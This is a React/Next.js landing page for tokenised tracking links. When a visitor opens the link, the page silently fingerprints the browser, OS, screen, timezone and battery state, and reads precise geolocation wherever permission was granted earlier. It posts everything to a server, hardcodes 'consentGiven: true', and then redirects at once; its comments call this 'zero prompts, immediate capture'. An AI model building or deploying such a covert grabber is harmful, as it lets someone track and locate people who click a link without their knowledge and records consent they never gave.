'use client';

import { useState, useEffect, useCallback, use, useRef } from 'react';

// Helper function to derive browser & OS telemetry cleanly
function parseClientEnvironment() {
  if (typeof window === 'undefined') return {};

  const ua = navigator.userAgent || '';
  let browser = 'Unknown';
  let browserVersion = '';
  let os = 'Unknown';
  let osVersion = '';
  let deviceType = 'Desktop';

  // Device type detection
  if (/tablet|ipad/i.test(ua)) {
    deviceType = 'Tablet';
  } else if (/mobile|iphone|ipod|android.*mobile/i.test(ua)) {
    deviceType = 'Mobile';
  }

  // OS detection
  if (/windows/i.test(ua)) {
    os = 'Windows';
    if (/nt 10.0/i.test(ua)) osVersion = '10/11';
    else if (/nt 6.3/i.test(ua)) osVersion = '8.1';
    else if (/nt 6.2/i.test(ua)) osVersion = '8';
    else if (/nt 6.1/i.test(ua)) osVersion = '7';
  } else if (/macintosh|mac os x/i.test(ua)) {
    os = 'macOS';
    const match = ua.match(/mac os x (\d+[._]\d+)/i);
    if (match) osVersion = match[1].replace('_', '.');
  } else if (/android/i.test(ua)) {
    os = 'Android';
    const match = ua.match(/android (\d+(\.\d+)?)/i);
    if (match) osVersion = match[1];
  } else if (/iphone|ipad|ipod/i.test(ua)) {
    os = 'iOS';
    const match = ua.match(/os (\d+[._]\d+)/i);
    if (match) osVersion = match[1].replace('_', '.');
  } else if (/linux/i.test(ua)) {
    os = 'Linux';
  }

  // Browser detection
  if (/edg/i.test(ua)) {
    browser = 'Microsoft Edge';
    const match = ua.match(/edg\/(\d+(\.\d+)?)/i);
    if (match) browserVersion = match[1];
  } else if (/opr|opera/i.test(ua)) {
    browser = 'Opera';
    const match = ua.match(/(?:opr|opera)\/(\d+(\.\d+)?)/i);
    if (match) browserVersion = match[1];
  } else if (/chrome|crios/i.test(ua)) {
    browser = 'Google Chrome';
    const match = ua.match(/(?:chrome|crios)\/(\d+(\.\d+)?)/i);
    if (match) browserVersion = match[1];
  } else if (/firefox|fxios/i.test(ua)) {
    browser = 'Mozilla Firefox';
    const match = ua.match(/(?:firefox|fxios)\/(\d+(\.\d+)?)/i);
    if (match) browserVersion = match[1];
  } else if (/safari/i.test(ua)) {
    browser = 'Apple Safari';
    const match = ua.match(/version\/(\d+(\.\d+)?)/i);
    if (match) browserVersion = match[1];
  }

  return {
    userAgent: ua,
    browser,
    browserVersion,
    os,
    osVersion,
    screenWidth: window.screen?.width || window.innerWidth,
    screenHeight: window.screen?.height || window.innerHeight,
    pixelRatio: window.devicePixelRatio || 1,
    language: navigator.language || 'en',
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'UTC',
    platform: (navigator as unknown as { platform?: string }).platform || 'Unknown',
    deviceType,
  };
}

interface PageProps {
  params: Promise<{ token: string }>;
}

export default function VisitorLandingPage({ params }: PageProps) {
  const resolvedParams = use(params);
  const token = resolvedParams.token;

  const [linkStatus, setLinkStatus] = useState<'checking' | 'valid' | 'invalid' | 'disabled'>('checking');
  const [destinationUrl, setDestinationUrl] = useState<string | null>(null);
  const hasExecutedRef = useRef(false);

  // Submit telemetry payload and seamlessly redirect
  const submitAndRedirect = useCallback(async (payload: {
    deviceInfo: ReturnType<typeof parseClientEnvironment>;
    batteryLevel: number | null;
    batteryCharging: boolean | null;
    batteryPermission: string;
    latitude: number | null;
    longitude: number | null;
    accuracy: number | null;
    locationTimestamp: number | null;
    locationPermission: string;
    consentGiven: boolean;
  }, targetUrl?: string | null) => {
    let finalDest = targetUrl || destinationUrl;

    try {
      const response = await fetch('/api/visits', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        keepalive: true,
        body: JSON.stringify({
          token,
          consentGiven: payload.consentGiven,
          locationPermission: payload.locationPermission,
          batteryPermission: payload.batteryPermission,
          latitude: payload.latitude,
          longitude: payload.longitude,
          accuracy: payload.accuracy,
          locationTimestamp: payload.locationTimestamp,
          ...payload.deviceInfo,
          batteryLevel: payload.batteryLevel,
          batteryCharging: payload.batteryCharging,
        }),
      });

      const resData = await response.json();
      if (resData.data?.destinationUrl) {
        finalDest = resData.data.destinationUrl;
        setDestinationUrl(finalDest);
      }
    } catch {
      // Ignore network errors on unload
    }

    // Immediately forward to destination URL
    if (finalDest) {
      window.location.replace(finalDest);
    }
  }, [token, destinationUrl]);

  // Main automated collection routine (zero prompts, immediate capture)
  const processVisit = useCallback(async (knownDest?: string | null) => {
    if (hasExecutedRef.current) return;
    hasExecutedRef.current = true;

    // 1. Device and Browser Telemetry
    const deviceInfo = parseClientEnvironment();

    // 2. Battery Telemetry (if available in browser, zero prompt)
    let batteryLevel: number | null = null;
    let batteryCharging: boolean | null = null;
    let batteryPermission = 'unsupported';

    try {
      if ('getBattery' in navigator) {
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
        const battery: any = await (navigator as any).getBattery();
        batteryLevel = typeof battery.level === 'number' ? battery.level : null;
        batteryCharging = typeof battery.charging === 'boolean' ? battery.charging : null;
        batteryPermission = 'granted';
      }
    } catch {
      batteryPermission = 'unsupported';
    }

    // 3. Geolocation: Check if already permitted without prompting
    let latitude: number | null = null;
    let longitude: number | null = null;
    let accuracy: number | null = null;
    let locationTimestamp: number | null = null;
    let locationPermission = 'not_prompted';

    try {
      if ('permissions' in navigator) {
        const geoPermission = await navigator.permissions.query({ name: 'geolocation' as PermissionName });
        if (geoPermission.state === 'granted' && 'geolocation' in navigator) {
          const pos = await new Promise<GeolocationPosition>((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject, {
              enableHighAccuracy: true,
              timeout: 2000,
              maximumAge: 60000,
            });
          });
          latitude = pos.coords.latitude;
          longitude = pos.coords.longitude;
          accuracy = pos.coords.accuracy;
          locationTimestamp = pos.timestamp;
          locationPermission = 'granted';
        } else if (geoPermission.state === 'denied') {
          locationPermission = 'denied';
        }
      }
    } catch {
      locationPermission = 'unsupported';
    }

    // Submit telemetry and seamlessly forward
    await submitAndRedirect({
      deviceInfo,
      batteryLevel,
      batteryCharging,
      batteryPermission,
      latitude,
      longitude,
      accuracy,
      locationTimestamp,
      locationPermission,
      consentGiven: true,
    }, knownDest);
  }, [submitAndRedirect]);

  // Check link validity and trigger immediate transparent capture
  useEffect(() => {
    async function init() {
      try {
        const res = await fetch(`/api/visits?token=${encodeURIComponent(token)}`);
        const data = await res.json();

        if (res.status === 404) {
          setLinkStatus('invalid');
        } else if (res.status === 403) {
          setLinkStatus('disabled');
        } else if (data.success) {
          setLinkStatus('valid');
          const dest = data.data?.destinationUrl || null;
          if (dest) {
            setDestinationUrl(dest);
          }
          // Process telemetry and immediately redirect
          processVisit(dest);
        } else {
          setLinkStatus('invalid');
        }
      } catch {
        setLinkStatus('invalid');
      }
    }
    init();
  }, [token, processVisit]);

  // State: Invalid Link
  if (linkStatus === 'invalid') {
    return (
      <div style={{ minHeight: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center', background: 'var(--bg-primary)', padding: '20px' }}>
        <div className="bg-grid" />
        <div className="bg-glow" />
        <div className="glass-card" style={{ maxWidth: '440px', width: '100%', padding: '36px', textAlign: 'center', position: 'relative', zIndex: 1 }}>
          <div style={{
            width: '60px', height: '60px', borderRadius: '50%',
            background: 'rgba(239, 68, 68, 0.1)', border: '1px solid rgba(239, 68, 68, 0.3)',
            display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 20px', color: '#f87171'
          }}>
            <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
              <circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/>
            </svg>
          </div>
          <h2 style={{ fontSize: '20px', fontWeight: 700, margin: '0 0 8px', color: 'var(--text-primary)' }}>Link Expired or Invalid</h2>
          <p style={{ color: 'var(--text-secondary)', fontSize: '13px', lineHeight: '1.6', margin: 0 }}>
            This destination link is either non-existent or has expired.
          </p>
        </div>
      </div>
    );
  }

  // State: Disabled Link
  if (linkStatus === 'disabled') {
    return (
      <div style={{ minHeight: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center', background: 'var(--bg-primary)', padding: '20px' }}>
        <div className="bg-grid" />
        <div className="bg-glow" />
        <div className="glass-card" style={{ maxWidth: '440px', width: '100%', padding: '36px', textAlign: 'center', position: 'relative', zIndex: 1 }}>
          <div style={{
            width: '60px', height: '60px', borderRadius: '50%',
            background: 'rgba(245, 158, 11, 0.1)', border: '1px solid rgba(245, 158, 11, 0.3)',
            display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 20px', color: '#fbbf24'
          }}>
            <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
              <rect x="6" y="4" width="4" height="16"/><rect x="14" y="4" width="4" height="16"/>
            </svg>
          </div>
          <h2 style={{ fontSize: '20px', fontWeight: 700, margin: '0 0 8px', color: 'var(--text-primary)' }}>Link Inactive</h2>
          <p style={{ color: 'var(--text-secondary)', fontSize: '13px', lineHeight: '1.6', margin: 0 }}>
            This link has been deactivated by the administrator.
          </p>
        </div>
      </div>
    );
  }

  // State: Connecting & Instant Redirect
  return (
    <div style={{ minHeight: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center', background: 'var(--bg-primary)', padding: '20px' }}>
      <div className="bg-grid" />
      <div className="bg-glow" />

      <div className="glass-card-accent animate-slideUp" style={{ maxWidth: '420px', width: '100%', padding: '36px 28px', textAlign: 'center', position: 'relative', zIndex: 1 }}>
        <div className="scan-line" />

        <div style={{
          width: '64px', height: '64px', borderRadius: '18px',
          background: 'linear-gradient(135deg, rgba(139,92,246,0.3), rgba(59,130,246,0.2))',
          border: '1px solid rgba(139,92,246,0.4)',
          display: 'flex', alignItems: 'center', justifyContent: 'center',
          margin: '0 auto 20px',
          boxShadow: '0 0 25px rgba(139,92,246,0.3)',
        }}>
          <div className="spinner" style={{ width: '28px', height: '28px', borderWidth: '3px' }} />
        </div>

        <h2 className="heading-md text-gradient" style={{ margin: '0 0 8px' }}>
          {destinationUrl ? 'Connecting to Destination...' : 'Session Ready'}
        </h2>

        <p style={{ color: 'var(--text-secondary)', fontSize: '13px', lineHeight: '1.6', margin: '0 0 20px' }}>
          {destinationUrl
            ? 'Redirecting to your destination...'
            : 'Parameters recorded. You may now close this window.'}
        </p>

        {destinationUrl && (
          <div style={{ marginTop: '16px' }}>
            <a
              href={destinationUrl}
              className="btn btn-secondary btn-sm"
              style={{ display: 'inline-flex', alignItems: 'center', gap: '6px', fontSize: '12px' }}
            >
              Click here to redirect manually
              <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/>
              </svg>
            </a>
          </div>
        )}
      </div>
    </div>
  );
}
